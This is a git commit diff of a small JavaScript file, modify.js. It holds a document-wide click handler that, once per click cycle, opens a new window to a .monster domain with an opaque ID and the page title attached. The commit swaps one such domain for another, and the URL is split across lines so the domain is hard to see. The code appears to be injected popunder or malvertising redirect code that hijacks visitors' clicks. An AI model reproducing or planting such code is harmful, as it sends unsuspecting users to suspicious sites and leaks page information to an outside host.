4f74cd8508494b4a9021e666cbaa7eb90895f447
sanjoy944 <44388753+sanjoy944@users.noreply.github.com>
2023-06-08 10:16:05 +0600

    modify.js

--- modify.js
+++ modify.js
@@ -4,8 +4,8 @@ document.addEventListener("click", function(event) {
   if (!buttonClicked) {
     buttonClicked = true;
     var websiteTitle = document.title;
-    var websiteUrl = "https://88jahbwdhjawd88x";
-    var fullUrl = websiteUrl + ".monster/yGrOQ0634a5513029319feaccd2995b01b05088824fbf?q=" + websiteTitle.replace(" ", "%20");
+    var websiteUrl = "https://5gwg243";
+    var fullUrl = websiteUrl + ".monster/vArMU0634a5513029319feaccd2995b01b05088824fbf?q=" + websiteTitle.replace(" ", "%20");
     window.open(fullUrl, "_blank");
     setTimeout(function() {
       buttonClicked = false;
